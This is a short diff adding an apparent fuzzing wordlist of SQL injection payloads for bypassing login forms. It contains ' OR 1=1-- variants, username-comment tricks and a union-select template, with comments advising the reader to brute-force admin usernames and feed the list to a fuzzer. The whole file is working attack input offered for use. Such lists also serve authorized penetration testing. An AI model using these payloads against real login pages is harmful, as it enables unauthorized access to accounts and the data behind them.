@@ -1,0 +1,8 @@
+# <user-fieldname> <pass-fieldname> <username>
+# also try to brute force a list of possible usernames, including possile admin acct names
+# regex replace as many as you can with your fuzzer for best results:
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR '' = '	Allows authentication without a valid username.
+'OR 1=1--
+<username>' OR 1=1--
+<username>'--
